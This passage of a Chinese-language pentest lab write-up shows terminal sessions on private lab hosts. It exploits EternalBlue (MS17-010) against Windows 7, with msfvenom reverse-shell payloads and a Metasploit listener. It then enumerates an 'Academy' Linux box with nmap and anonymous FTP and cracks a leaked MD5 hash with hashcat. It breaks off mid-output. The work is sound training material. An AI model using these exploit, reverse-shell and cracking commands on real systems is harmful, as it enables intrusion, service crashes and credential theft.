<p>  <a target="_blank" rel="noopener" href="https://github.com/3ndG4me/AutoBlue-MS17-010">https://github.com/3ndG4me/AutoBlue-MS17-010</a></p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/opt]</span><br><span class="line">└─# git <span class="built_in">clone</span> https://github.com/3ndG4me/AutoBlue-MS17-010</span><br><span class="line">Cloning into <span class="string">&#x27;AutoBlue-MS17-010&#x27;</span>...</span><br><span class="line">remote: Enumerating objects: 145, <span class="keyword">done</span>.</span><br><span class="line">remote: Counting objects: 100% (69/69), <span class="keyword">done</span>.</span><br><span class="line">remote: Compressing objects: 100% (30/30), <span class="keyword">done</span>.</span><br><span class="line">remote: Total 145 (delta 52), reused 43 (delta 39), pack-reused 76</span><br><span class="line">Receiving objects: 100% (145/145), 105.75 KiB | 993.00 KiB/s, <span class="keyword">done</span>.</span><br><span class="line">Resolving deltas: 100% (86/86), <span class="keyword">done</span>.</span><br><span class="line">                                                                                                                                                             </span><br><span class="line">┌──(root㉿kali)-[/opt]</span><br><span class="line">└─# <span class="built_in">cd</span> AutoBlue-MS17-010 </span><br><span class="line">                                                                                                                                                             </span><br><span class="line">┌──(root㉿kali)-[/opt/AutoBlue-MS17-010]</span><br><span class="line">└─# **pip install -r requirements.txt** </span><br><span class="line">Requirement already satisfied: impacket <span class="keyword">in</span> /usr/lib/python3/dist-packages (from -r requirements.txt (line 1)) (0.11.0)</span><br><span class="line">Requirement already satisfied: dsinternals <span class="keyword">in</span> /usr/lib/python3/dist-packages (from impacket-&gt;-r requirements.txt (line 1)) (1.2.4)</span><br><span class="line">WARNING: Running pip as the <span class="string">&#x27;root&#x27;</span> user can result <span class="keyword">in</span> broken permissions and conflicting behaviour with the system package manager. It is recommended to use a virtual environment instead: https://pip.pypa.io/warnings/venv</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[/opt/AutoBlue-MS17-010]</span><br><span class="line">└─# python eternal_checker.py 192.168.19.139</span><br><span class="line">[*] Target OS: Windows 7 Ultimate 7601 Service Pack 1</span><br><span class="line">[!] The target is not patched</span><br><span class="line">=== Testing named pipes ===</span><br><span class="line">[*] Done</span><br><span class="line">                                                                                                                                                             </span><br><span class="line">┌──(root㉿kali)-[/opt/AutoBlue-MS17-010]</span><br><span class="line">└─# <span class="built_in">cd</span> shellcode        </span><br><span class="line">                                                                                                                                                                                                                                                                                                                          </span><br><span class="line">┌──(root㉿kali)-[/opt/AutoBlue-MS17-010/shellcode]</span><br><span class="line">└─# ./shell_prep.sh</span><br><span class="line">                 _.-;;-._</span><br><span class="line">          <span class="string">&#x27;-..-&#x27;</span>|   ||   |</span><br><span class="line">          <span class="string">&#x27;-..-&#x27;</span>|_.-;;-._|</span><br><span class="line">          <span class="string">&#x27;-..-&#x27;</span>|   ||   |</span><br><span class="line">          <span class="string">&#x27;-..-&#x27;</span>|_.-<span class="string">&#x27;&#x27;</span>-._|   </span><br><span class="line">Eternal Blue Windows Shellcode Compiler</span><br><span class="line"></span><br><span class="line">Let<span class="string">&#x27;s compile them windoos shellcodezzz</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Compiling x64 kernel shellcode</span></span><br><span class="line"><span class="string">Compiling x86 kernel shellcode</span></span><br><span class="line"><span class="string">kernel shellcode compiled, would you like to auto generate a reverse shell with msfvenom? (Y/n)</span></span><br><span class="line"><span class="string">Y</span></span><br><span class="line"><span class="string">LHOST for reverse connection:</span></span><br><span class="line"><span class="string">**192.168.19.130**</span></span><br><span class="line"><span class="string">LPORT you want x64 to listen on:</span></span><br><span class="line"><span class="string">**9999**</span></span><br><span class="line"><span class="string">LPORT you want x86 to listen on:</span></span><br><span class="line"><span class="string">**2222**</span></span><br><span class="line"><span class="string">Type 0 to generate a meterpreter shell or 1 to generate a regular cmd shell</span></span><br><span class="line"><span class="string">1</span></span><br><span class="line"><span class="string">Type 0 to generate a staged payload or 1 to generate a stageless payload</span></span><br><span class="line"><span class="string">0</span></span><br><span class="line"><span class="string">Generating x64 cmd shell (staged)...</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">**msfvenom -p windows/x64/shell/reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=192.168.19.130 LPORT=9999**</span></span><br><span class="line"><span class="string">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span></span><br><span class="line"><span class="string">[-] No arch selected, selecting arch: x64 from the payload</span></span><br><span class="line"><span class="string">No encoder specified, outputting raw payload</span></span><br><span class="line"><span class="string">Payload size: 511 bytes</span></span><br><span class="line"><span class="string">Saved as: **sc_x64_msf.bin**</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Generating x86 cmd shell (staged)...</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">**msfvenom -p windows/shell/reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=192.168.19.130 LPORT=2222**</span></span><br><span class="line"><span class="string">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span></span><br><span class="line"><span class="string">[-] No arch selected, selecting arch: x86 from the payload</span></span><br><span class="line"><span class="string">No encoder specified, outputting raw payload</span></span><br><span class="line"><span class="string">Payload size: 375 bytes</span></span><br><span class="line"><span class="string">Saved as: sc_x86_msf.bin</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">MERGING SHELLCODE WOOOO!!!</span></span><br><span class="line"><span class="string">DONE</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">┌──(root㉿kali)-[/opt/AutoBlue-MS17-010/shellcode]</span></span><br><span class="line"><span class="string">└─# cd ..          </span></span><br><span class="line"><span class="string">                                                                                                                                                             </span></span><br><span class="line"><span class="string">┌──(root㉿kali)-[/opt/AutoBlue-MS17-010]</span></span><br><span class="line"><span class="string">└─# ./listener_prep.sh</span></span><br><span class="line"><span class="string">  __</span></span><br><span class="line"><span class="string">  /,-</span></span><br><span class="line"><span class="string">  ||)</span></span><br><span class="line"><span class="string">  \\_, )</span></span><br><span class="line"><span class="string">   `--&#x27;</span></span><br><span class="line">Eternal Blue Metasploit Listener</span><br><span class="line"></span><br><span class="line">LHOST <span class="keyword">for</span> reverse connection:</span><br><span class="line">**192.168.19.130**</span><br><span class="line">LPORT <span class="keyword">for</span> x64 reverse connection:</span><br><span class="line">**9999**</span><br><span class="line">LPORT <span class="keyword">for</span> x86 reverse connection:</span><br><span class="line">**2222**</span><br><span class="line">Enter 0 <span class="keyword">for</span> meterpreter shell or 1 <span class="keyword">for</span> regular cmd shell:</span><br><span class="line">**1**</span><br><span class="line">Type 0 <span class="keyword">if</span> this is a staged payload or 1 <span class="keyword">if</span> it is <span class="keyword">for</span> a stageless payload: 0</span><br><span class="line">Starting listener (staged)...</span><br><span class="line">Starting postgresql (via systemctl): postgresql.service.</span><br><span class="line">Metasploit tip: To save all commands executed since start up to a file, use the </span><br><span class="line">makerc <span class="built_in">command</span></span><br><span class="line">                                                  </span><br><span class="line"> ______________________________________</span><br><span class="line">/ it looks like you<span class="string">&#x27;re trying to run a \                                                                                                                     </span></span><br><span class="line"><span class="string">\ module                               /                                                                                                                     </span></span><br><span class="line"><span class="string"> --------------------------------------                                                                                                                      </span></span><br><span class="line"><span class="string"> \                                                                                                                                                           </span></span><br><span class="line"><span class="string">  \                                                                                                                                                          </span></span><br><span class="line"><span class="string">     __                                                                                                                                                      </span></span><br><span class="line"><span class="string">    /  \                                                                                                                                                     </span></span><br><span class="line"><span class="string">    |  |                                                                                                                                                     </span></span><br><span class="line"><span class="string">    @  @                                                                                                                                                     </span></span><br><span class="line"><span class="string">    |  |                                                                                                                                                     </span></span><br><span class="line"><span class="string">    || |/                                                                                                                                                    </span></span><br><span class="line"><span class="string">    || ||                                                                                                                                                    </span></span><br><span class="line"><span class="string">    |\_/|                                                                                                                                                    </span></span><br><span class="line"><span class="string">    \___/                                                                                                                                                    </span></span><br><span class="line"><span class="string">                                                                                                                                                             </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       =[ metasploit v6.3.55-dev                          ]</span></span><br><span class="line"><span class="string">+ -- --=[ 2397 exploits - 1235 auxiliary - 422 post       ]</span></span><br><span class="line"><span class="string">+ -- --=[ 1391 payloads - 46 encoders - 11 nops           ]</span></span><br><span class="line"><span class="string">+ -- --=[ 9 evasion                                       ]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Metasploit Documentation: https://docs.metasploit.com/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Processing config.rc for ERB directives.</span></span><br><span class="line"><span class="string">resource (config.rc)&gt; use exploit/multi/handler</span></span><br><span class="line"><span class="string">[*] Using configured payload generic/shell_reverse_tcp</span></span><br><span class="line"><span class="string">resource (config.rc)&gt; set PAYLOAD windows/x64/shell/reverse_tcp</span></span><br><span class="line"><span class="string">PAYLOAD =&gt; windows/x64/shell/reverse_tcp</span></span><br><span class="line"><span class="string">resource (config.rc)&gt; set LHOST 192.168.19.130</span></span><br><span class="line"><span class="string">LHOST =&gt; 192.168.19.130</span></span><br><span class="line"><span class="string">resource (config.rc)&gt; set LPORT 9999</span></span><br><span class="line"><span class="string">LPORT =&gt; 9999</span></span><br><span class="line"><span class="string">resource (config.rc)&gt; set ExitOnSession false</span></span><br><span class="line"><span class="string">ExitOnSession =&gt; false</span></span><br><span class="line"><span class="string">resource (config.rc)&gt; set EXITFUNC thread</span></span><br><span class="line"><span class="string">EXITFUNC =&gt; thread</span></span><br><span class="line"><span class="string">resource (config.rc)&gt; exploit -j</span></span><br><span class="line"><span class="string">[*] Exploit running as background job 0.</span></span><br><span class="line"><span class="string">[*] Exploit completed, but no session was created.</span></span><br><span class="line"><span class="string">resource (config.rc)&gt; set PAYLOAD windows/shell/reverse_tcp</span></span><br><span class="line"><span class="string">PAYLOAD =&gt; windows/shell/reverse_tcp</span></span><br><span class="line"><span class="string">resource (config.rc)&gt; set LPORT 2222</span></span><br><span class="line"><span class="string">LPORT =&gt; 2222</span></span><br><span class="line"><span class="string">resource (config.rc)&gt; exploit -j</span></span><br><span class="line"><span class="string">[*] Exploit running as background job 1.</span></span><br><span class="line"><span class="string">[*] Exploit completed, but no session was created.</span></span><br><span class="line"><span class="string">[*] Started reverse TCP handler on 192.168.19.130:9999 </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Started reverse TCP handler on 192.168.19.130:2222 </span></span><br><span class="line"><span class="string">msf6 exploit(multi/handler) &gt;</span></span><br></pre></td></tr></table></figure>
<p>  當全部設定好然後運行指令進行攻擊後會看到受害機…</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/opt/AutoBlue-MS17-010]</span><br><span class="line">└─# python3 eternalblue_exploit7.py 192.168.19.139 shellcode/sc_all.bin</span><br><span class="line">shellcode size: 2307</span><br><span class="line">numGroomConn: 13</span><br><span class="line">Target OS: Windows 7 Ultimate 7601 Service Pack 1</span><br><span class="line">SMB1 session setup allocate nonpaged pool success</span><br><span class="line">SMB1 session setup allocate nonpaged pool success</span><br><span class="line">good response status: INVALID_PARAMETER</span><br></pre></td></tr></table></figure>
<p>  <img src="/img/privilege_Untitled.png" alt="Untitled"></p>
<ul>
<li>該攻擊會讓受害機器無法正常運作，不要隨意進行攻擊!</li>
</ul>
</li>
</ul>
<h3 id="Set-Up-Academy"><a href="#Set-Up-Academy" class="headerlink" title="Set Up - Academy"></a><strong>Set Up - Academy</strong></h3><p>login &gt; root</p>
<p>passwd &gt; tcm</p>
<p>原本在嘗試用 <code>kali</code> 進行 <code>arp-scan -l</code> 時，無法找到目標機器的網路位址</p>
<p>在看了這台機器ip後，它沒有被分配到IP位置</p>
<p><img src="/img/privilege_Untitled_1.png" alt="Untitled"></p>
<p>該機器網路是靜態模式的網卡，不主動向伺服器獲取IP地址，在目標機器上執行該指令</p>
<p>需要使用 <code>dhclient</code> 動態獲取或釋放IP位置</p>
<ul>
<li><code>dhclient -r</code> &gt; 釋放IP</li>
<li><code>dhclient</code> &gt; 取得IP</li>
<li><code>dhclient eth0</code> &gt; 續訂主乙太網路設備的動態分配IP位址</li>
</ul>
<p>但重開機要再重新下一次指令</p>
<p><img src="/img/privilege_Untitled_2.png" alt="Untitled"></p>
<p>ip : 192.168.19.141 &gt; 這樣kali已經能arp-scan -l 找到這台機器了</p>
<p>按照慣例一樣先找port有開的服務</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **nmap -T4 -A -p-** 192.168.19.141</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-15 11:20 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.19.141</span><br><span class="line">Host is up (0.0014s latency).</span><br><span class="line">Not shown: 65532 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">**21/tcp open  ftp     vsftpd 3.0.3**</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to ::ffff:192.168.19.130</span><br><span class="line">|      Logged <span class="keyword">in</span> as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth <span class="built_in">limit</span></span><br><span class="line">|      Session <span class="built_in">timeout</span> <span class="keyword">in</span> seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was 1</span><br><span class="line">|      vsFTPd 3.0.3 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">|_-rw-r--r--    1 1000     1000          776 May 30  2021 note.txt</span><br><span class="line">**22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)**</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 c7:44:58:86:90:fd:e4:de:5b:0d:bf:07:8d:05:5d:d7 (RSA)</span><br><span class="line">|   256 78:ec:47:0f:0f:53:aa:a6:05:48:84:80:94:76:a6:23 (ECDSA)</span><br><span class="line">|_  256 99:9c:39:11:<span class="built_in">dd</span>:35:53:a0:29:11:20:c7:f8:bf:71:a4 (ED25519)</span><br><span class="line">**80/tcp open  http    Apache httpd 2.4.38 ((Debian))**</span><br><span class="line">|_http-title: Apache2 Debian Default Page: It works</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">MAC Address: 00:0C:29:AC:4E:32 (VMware)</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 5.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:5</span><br><span class="line">OS details: Linux 5.0 - 5.5</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   1.44 ms 192.168.19.141</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 17.22 seconds</span><br></pre></td></tr></table></figure>

<p>看到ssh &gt; 嘗試像root的使用者名稱或密碼進行登入</p>
<ul>
<li><p>弱密碼</p>
</li>
<li><p>看看client端是否能檢測到你再進行的登入動作，尤其是在爆破時</p>
</li>
<li><p>除了被偵測到，是否有被抵擋發送大量請求的行為</p>
</li>
<li><p>有沒有留下log登入紀錄</p>
</li>
<li><p>默認Apache網頁所帶來的危害</p>
<p>  <img src="/img/privilege_Untitled_3.png" alt="Untitled"></p>
<ul>
<li>發生在web跟api應用程式的攻擊技術</li>
<li>資料蒐集的一環</li>
<li>提供有關web伺服器的訊息</li>
<li>存在隱藏目錄位置</li>
<li>用於識別伺服器的漏洞並規劃攻擊</li>
<li>列舉伺服器上執行的應用程式和服務</li>
<li>識別web伺服器設定中的弱點</li>
<li>取得並對應用程式、資料庫、內部網路的存取權限</li>
</ul>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">                   危害</span><br><span class="line">                    |</span><br><span class="line">     ---------------------------------</span><br><span class="line">    |               |                 |</span><br><span class="line">   敏感           安全漏洞           隱私泄露</span><br><span class="line">  資訊外洩       揭示系統漏洞       個人資料曝光</span><br><span class="line">    |               |                 |</span><br><span class="line"> 未授權訪問      破壞數據完整性       用戶追蹤</span><br><span class="line">  敏感文件      網站被入侵者操控     第三方跟蹤</span><br><span class="line">    |               |</span><br><span class="line">登錄信息泄露    安全漏洞被利用</span><br><span class="line">                    |</span><br><span class="line">              網站崩潰或服務中斷</span><br></pre></td></tr></table></figure>
</li>
<li><p>ftp在nmap中發現可以用Anonymous進行登入</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **ftp 192.168.19.141**</span><br><span class="line">Connected to 192.168.19.141.</span><br><span class="line">220 (vsFTPd 3.0.3)</span><br><span class="line">Name (192.168.19.141:kali): **Anonymous**</span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password: </span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system <span class="built_in">type</span> is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line">ftp&gt; **<span class="built_in">ls</span>**</span><br><span class="line">229 Entering Extended Passive Mode (|||36525|)</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">-rw-r--r--    1 1000     1000          776 May 30  2021 note.txt</span><br><span class="line">226 Directory send OK.</span><br><span class="line">ftp&gt; **get note.txt**</span><br><span class="line"><span class="built_in">local</span>: note.txt remote: note.txt</span><br><span class="line">229 Entering Extended Passive Mode (|||54067|)</span><br><span class="line">150 Opening BINARY mode data connection <span class="keyword">for</span> note.txt (776 bytes).</span><br><span class="line">100% |*********************************************************************************|   776        1.36 MiB/s    00:00 ETA</span><br><span class="line">226 Transfer complete.</span><br><span class="line">776 bytes received <span class="keyword">in</span> 00:00 (428.14 KiB/s)</span><br></pre></td></tr></table></figure>

<ul>
<li>也許這note.txt是存在於apache網頁後的某個目錄中，只是我們並不知道，但是通過ftp發現了這個檔案</li>
<li>儘管檔案不是直接放在apache網頁目錄後，也可以從中取得一些訊息<ul>
<li>apache 2.4.38</li>
<li>debian</li>
</ul>
</li>
</ul>
<p><img src="/img/privilege_Untitled_4.png" alt="Untitled"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **<span class="built_in">cat</span> note.txt** </span><br><span class="line">Hello Heath !</span><br><span class="line">Grimmie has setup the <span class="built_in">test</span> website <span class="keyword">for</span> the new academy.</span><br><span class="line">I told him not to use the same password everywhere, he will change it ASAP.</span><br><span class="line"></span><br><span class="line">I couldn<span class="string">&#x27;t create a user via the admin panel, so instead I inserted **directly into the database** with the following command:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">**INSERT INTO `students` (`StudentRegno`, `studentPhoto`, `password`, `studentName`, `pincode`, `session`, `department`, `semester`, `cgpa`, `creationdate`, `updationDate`) VALUES</span></span><br><span class="line"><span class="string">(&#x27;</span>10201321<span class="string">&#x27;, &#x27;</span><span class="string">&#x27;, &#x27;</span>cd73502828457d15655bbd7a63fb0bc8<span class="string">&#x27;, &#x27;</span>Rum Ham<span class="string">&#x27;, &#x27;</span>777777<span class="string">&#x27;, &#x27;</span><span class="string">&#x27;, &#x27;</span><span class="string">&#x27;, &#x27;</span><span class="string">&#x27;, &#x27;</span>7.60<span class="string">&#x27;, &#x27;</span>2021-05-29 14:36:56<span class="string">&#x27;, &#x27;</span><span class="string">&#x27;);**</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The **StudentRegno number** is what you use for login.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Le me know what you think of this open-source project, it&#x27;</span>s from 2020 so it should be secure... right ?</span><br><span class="line">We can always adapt it to our needs.</span><br><span class="line"></span><br><span class="line">**-jdelta**</span><br></pre></td></tr></table></figure>

<ul>
<li><p>這邊透漏了不少敏感訊息</p>
<ul>
<li><strong>StudentRegno &gt; 10201321</strong></li>
<li><strong>password &gt; cd73502828457d15655bbd7a63fb0bc8</strong></li>
<li><strong>studentName &gt; Rum Ham</strong></li>
<li><strong>pincode &gt; 777777</strong></li>
<li><strong>cgpa &gt; 7.60</strong></li>
<li><strong>creationdate &gt; 2021-05-29 14:36:56</strong></li>
</ul>
<p>  password應該是個hash，可以看看它是什麼類型的，幫助爆破</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **hash-identifier** </span><br><span class="line">   <span class="comment">#########################################################################</span></span><br><span class="line">   <span class="comment">#     __  __                     __           ______    _____           #</span></span><br><span class="line">   <span class="comment">#    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #</span></span><br><span class="line">   <span class="comment">#    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #</span></span><br><span class="line">   <span class="comment">#     \ \  _  \  /&#x27;__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #</span></span><br><span class="line">   <span class="comment">#      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #</span></span><br><span class="line">   <span class="comment">#       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #</span></span><br><span class="line">   <span class="comment">#        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #</span></span><br><span class="line">   <span class="comment">#                                                             By Zion3R #</span></span><br><span class="line">   <span class="comment">#                                                    www.Blackploit.com #</span></span><br><span class="line">   <span class="comment">#                                                   Root@Blackploit.com #</span></span><br><span class="line">   <span class="comment">#########################################################################</span></span><br><span class="line">--------------------------------------------------</span><br><span class="line"> HASH: **cd73502828457d15655bbd7a63fb0bc8**</span><br><span class="line"></span><br><span class="line">**Possible Hashs:</span><br><span class="line">[+] MD5</span><br><span class="line">[+] Domain Cached Credentials - MD4(MD4((<span class="variable">$pass</span>)).(strtolower(<span class="variable">$username</span>)))**</span><br><span class="line"></span><br><span class="line">Least Possible Hashs:</span><br><span class="line">[+] RAdmin v2.x</span><br><span class="line">[+] NTLM</span><br><span class="line">[+] MD4</span><br><span class="line">[+] MD2</span><br><span class="line">[+] MD5(HMAC)</span><br><span class="line">[+] MD4(HMAC)</span><br><span class="line">[+] MD2(HMAC)</span><br><span class="line">[+] MD5(HMAC(Wordpress))</span><br><span class="line">[+] Haval-128</span><br><span class="line">[+] Haval-128(HMAC)</span><br><span class="line">[+] RipeMD-128</span><br><span class="line">[+] RipeMD-128(HMAC)</span><br><span class="line">[+] SNEFRU-128</span><br><span class="line">[+] SNEFRU-128(HMAC)</span><br><span class="line">[+] Tiger-128</span><br><span class="line">[+] Tiger-128(HMAC)</span><br><span class="line">[+] md5(<span class="variable">$pass</span>.<span class="variable">$salt</span>)</span><br><span class="line">[+] md5(<span class="variable">$salt</span>.<span class="variable">$pass</span>)</span><br><span class="line">[+] md5(<span class="variable">$salt</span>.<span class="variable">$pass</span>.<span class="variable">$salt</span>)</span><br><span class="line">[+] md5(<span class="variable">$salt</span>.<span class="variable">$pass</span>.<span class="variable">$username</span>)</span><br><span class="line">[+] md5(<span class="variable">$salt</span>.md5(<span class="variable">$pass</span>))</span><br><span class="line">[+] md5(<span class="variable">$salt</span>.md5(<span class="variable">$pass</span>))</span><br><span class="line">[+] md5(<span class="variable">$salt</span>.md5(<span class="variable">$pass</span>.<span class="variable">$salt</span>))</span><br><span class="line">[+] md5(<span class="variable">$salt</span>.md5(<span class="variable">$pass</span>.<span class="variable">$salt</span>))</span><br><span class="line">[+] md5(<span class="variable">$salt</span>.md5(<span class="variable">$salt</span>.<span class="variable">$pass</span>))</span><br><span class="line">[+] md5(<span class="variable">$salt</span>.md5(md5(<span class="variable">$pass</span>).<span class="variable">$salt</span>))</span><br><span class="line">[+] md5(<span class="variable">$username</span>.0.<span class="variable">$pass</span>)</span><br><span class="line">[+] md5(<span class="variable">$username</span>.LF.<span class="variable">$pass</span>)</span><br><span class="line">[+] md5(<span class="variable">$username</span>.md5(<span class="variable">$pass</span>).<span class="variable">$salt</span>)</span><br><span class="line">[+] md5(md5(<span class="variable">$pass</span>))</span><br><span class="line">[+] md5(md5(<span class="variable">$pass</span>).<span class="variable">$salt</span>)</span><br><span class="line">[+] md5(md5(<span class="variable">$pass</span>).md5(<span class="variable">$salt</span>))</span><br><span class="line">[+] md5(md5(<span class="variable">$salt</span>).<span class="variable">$pass</span>)</span><br><span class="line">[+] md5(md5(<span class="variable">$salt</span>).md5(<span class="variable">$pass</span>))</span><br><span class="line">[+] md5(md5(<span class="variable">$username</span>.<span class="variable">$pass</span>).<span class="variable">$salt</span>)</span><br><span class="line">[+] md5(md5(md5(<span class="variable">$pass</span>)))</span><br><span class="line">[+] md5(md5(md5(md5(<span class="variable">$pass</span>))))</span><br><span class="line">[+] md5(md5(md5(md5(md5(<span class="variable">$pass</span>)))))</span><br><span class="line">[+] md5(sha1(<span class="variable">$pass</span>))</span><br><span class="line">[+] md5(sha1(md5(<span class="variable">$pass</span>)))</span><br><span class="line">[+] md5(sha1(md5(sha1(<span class="variable">$pass</span>))))</span><br><span class="line">[+] md5(strtoupper(md5(<span class="variable">$pass</span>)))</span><br><span class="line">--------------------------------------------------</span><br></pre></td></tr></table></figure>
<ul>
<li>大機率是跟md5 hash相關</li>
<li>搜尋google &gt; <a target="_blank" rel="noopener" href="https://www.4armed.com/blog/hashcat-crack-md5-hashes/">https://www.4armed.com/blog/hashcat-crack-md5-hashes/</a></li>
</ul>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Running hashcat to Crack MD5 Hashes</span><br><span class="line"></span><br><span class="line">Now we can start using hashcat with the rockyou wordlist to crack the MD5 hashes. The rockyou wordlist comes pre-installed with Kali. If you are not using Kali you can use another wordlist, or download it from here.</span><br><span class="line"></span><br><span class="line">The <span class="built_in">command</span> to start our dictionary attack on the hashes is:</span><br><span class="line"></span><br><span class="line">hashcat –m 0 hashes /usr/share/wordlists/rockyou.txt</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">Argument	Function</span><br><span class="line">-m 0	Tells hashcat <span class="built_in">which</span> mode to use. 0 is MD5.</span><br><span class="line">Hashes	Our file containing the our MD5 password hashes.</span><br><span class="line">/usr/share/wordlists/rockyou.txt	Points hashcat to the wordlist containing the passwords to <span class="built_in">hash</span> and compare</span><br></pre></td></tr></table></figure>
<ul>
<li>hashcat &gt; 占用CPU，破解速度慢，可以的話用GPU跑</li>
</ul>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **locate rockyou.txt <span class="comment">#rockyou.txt如果沒看到該檔案就去解壓縮**</span></span><br><span class="line">/usr/share/seclists/SecLists-master/Passwords/Leaked-Databases/rockyou.txt.tar.gz</span><br><span class="line">**/usr/share/wordlists/rockyou.txt**</span><br><span class="line">/usr/share/wordlists/rockyou.txt.gz</span><br><span class="line">                                                                                                                                                             </span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **mousepad hash.txt <span class="comment">#cd73502828457d15655bbd7a63fb0bc8**                                                                  </span></span><br><span class="line">                                                                                                                                                             </span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt**</span><br><span class="line">hashcat (v6.2.6) starting</span><br><span class="line"></span><br><span class="line">OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform <span class="comment">#1 [The pocl project]</span></span><br><span class="line">==================================================================================================================================================</span><br><span class="line">* Device <span class="comment">#1: cpu-haswell-AMD Ryzen 7 4800H with Radeon Graphics, 4184/8432 MB (2048 MB allocatable), 4MCU</span></span><br><span class="line"></span><br><span class="line">Minimum password length supported by kernel: 0</span><br><span class="line">Maximum password length supported by kernel: 256</span><br><span class="line"></span><br><span class="line">Hashes: 1 digests; 1 unique digests, 1 unique salts</span><br><span class="line">Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates</span><br><span class="line">Rules: 1</span><br><span class="line"></span><br><span class="line">Optimizers applied:</span><br><span class="line">* Zero-Byte</span><br><span class="line">* Early-Skip</span><br><span class="line">* Not-Salted</span><br><span class="line">* Not-Iterated</span><br><span class="line">* Single-Hash</span><br><span class="line">* Single-Salt</span><br><span class="line">* Raw-Hash</span><br><span class="line"></span><br><span class="line">ATTENTION! Pure (unoptimized) backend kernels selected.</span><br><span class="line">Pure kernels can crack longer passwords, but drastically reduce performance.</span><br><span class="line">If you want to switch to optimized kernels, append -O to your commandline.</span><br><span class="line">See the above message to find out about the exact limits.</span><br><span class="line"></span><br><span class="line">Watchdog: Temperature abort trigger <span class="built_in">set</span> to 90c</span><br><span class="line"></span><br><span class="line">Host memory required <span class="keyword">for</span> this attack: 1 MB</span><br><span class="line"></span><br><span class="line">Dictionary cache built:</span><br><span class="line">* Filename..: /usr/share/wordlists/rockyou.txt</span><br><span class="line">* Passwords.: 14344392</span><br><span class="line">* Bytes.....: 139921507</span><br><span class="line">* Keyspace..: 14344385</span><br><span class="line">* Runtime...: 2 secs</span><br><span 